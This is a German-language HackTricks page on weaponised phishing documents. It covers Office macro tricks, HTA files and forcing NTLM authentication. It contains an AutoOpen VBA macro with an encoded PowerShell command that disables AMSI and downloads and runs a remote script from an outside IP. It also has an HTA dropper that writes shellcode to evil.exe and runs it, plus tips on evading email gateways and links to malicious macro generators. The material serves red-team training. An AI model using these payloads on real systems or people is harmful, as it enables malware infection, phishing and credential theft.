# Phishing-Dateien & Dokumente

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) bei oder der [**Telegram-Gruppe**](https://t.me/peass) oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**HackTricks-Repo**](https://github.com/carlospolop/hacktricks) **und das** [**HackTricks-Cloud-Repo**](https://github.com/carlospolop/hacktricks-cloud) **einreichen**.

</details>

## Office-Dokumente

Microsoft Word führt vor dem Öffnen einer Datei eine Datenvalidierung durch. Die Datenvalidierung erfolgt in Form der Identifizierung der Datenstruktur gemäß dem OfficeOpenXML-Standard. Wenn während der Identifizierung der Datenstruktur ein Fehler auftritt, wird die analysierte Datei nicht geöffnet.

In der Regel verwenden Word-Dateien mit Makros die Erweiterung `.docm`. Es ist jedoch möglich, die Datei durch Ändern der Dateierweiterung umzubenennen und dennoch ihre Makroausführungsfähigkeiten beizubehalten.\
Beispielsweise unterstützt eine RTF-Datei standardmäßig keine Makros, aber eine als RTF umbenannte DOCM-Datei wird von Microsoft Word verarbeitet und ist in der Lage, Makros auszuführen.\
Die gleichen internen Abläufe und Mechanismen gelten für alle Softwareprodukte des Microsoft Office-Pakets (Excel, PowerPoint usw.).

Sie können den folgenden Befehl verwenden, um zu überprüfen, welche Erweiterungen von einigen Office-Programmen ausgeführt werden:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX-Dateien, die auf eine externe Vorlage verweisen (Datei - Optionen - Add-Ins - Verwalten: Vorlagen - Los), die Makros enthält, können auch Makros "ausführen".

### Externes Bild laden

Gehe zu: _Einfügen --> Schnellbausteine --> Feld_\
_**Kategorien**: Links und Verweise, **Feldnamen**: includePicture, und **Dateiname oder URL**:_ http://\<ip>/whatever

![](<../../.gitbook/assets/image (155).png>)

### Makro-Backdoor

Es ist möglich, Makros zu verwenden, um beliebigen Code aus dem Dokument auszuführen.

#### Autoload-Funktionen

Je häufiger sie sind, desto wahrscheinlicher ist es, dass die AV sie erkennt.

* AutoOpen()
* Document\_Open()

#### Makro-Codebeispiele
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manuell Metadaten entfernen

Gehe zu **Datei > Informationen > Dokument überprüfen > Dokument überprüfen**, um den Dokumenteninspektor aufzurufen. Klicke auf **Überprüfen** und dann auf **Alle entfernen** neben **Dokumenteigenschaften und persönliche Informationen**.

#### Doc-Erweiterung

Nach Abschluss wähle im Dropdown-Menü **Speichern unter** das Format von **`.docx`** zu **Word 97-2003 `.doc`**.\
Mache dies, da du **Makros nicht in einer `.docx` speichern kannst** und es ein **Stigma** um die makrofähige **`.docm`**-Erweiterung gibt (z. B. das Miniaturbildsymbol hat ein großes `!` und einige Web-/E-Mail-Gateways blockieren sie vollständig). Daher ist diese **veraltete `.doc`-Erweiterung der beste Kompromiss**.

#### Bösartige Makro-Generatoren

* MacOS
* [**macphish**](https://github.com/cldrn/macphish)
* [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA-Dateien

Eine HTA ist ein Windows-Programm, das **HTML und Skriptsprachen (wie VBScript und JScript) kombiniert**. Es generiert die Benutzeroberfläche und führt als "voll vertrauenswürdige" Anwendung aus, ohne die Einschränkungen des Sicherheitsmodells eines Browsers.

Eine HTA wird mit **`mshta.exe`** ausgeführt, das in der Regel **zusammen mit Internet Explorer installiert** wird und **`mshta` von IE abhängig** macht. Wenn es deinstalliert wurde, können HTAs nicht ausgeführt werden.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Erzwingen der NTLM-Authentifizierung

Es gibt mehrere Möglichkeiten, die **NTLM-Authentifizierung "remote" zu erzwingen**, zum Beispiel könnten Sie **unsichtbare Bilder** zu E-Mails oder HTML hinzufügen, auf die der Benutzer zugreifen wird (sogar HTTP MitM?). Oder senden Sie dem Opfer die **Adresse von Dateien**, die eine **Authentifizierung auslösen**, nur um **den Ordner zu öffnen**.

**Überprüfen Sie diese Ideen und mehr auf den folgenden Seiten:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM-Relais

Vergessen Sie nicht, dass Sie nicht nur den Hash oder die Authentifizierung stehlen können, sondern auch **NTLM-Relaisangriffe durchführen können**:

* [**NTLM-Relaisangriffe**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (NTLM-Relais zu Zertifikaten)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? oder möchten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich den [**offiziellen PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks-Repository**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud-Repository**](https://github.com/carlospolop/hacktricks-cloud) **einreichen**.

</details>
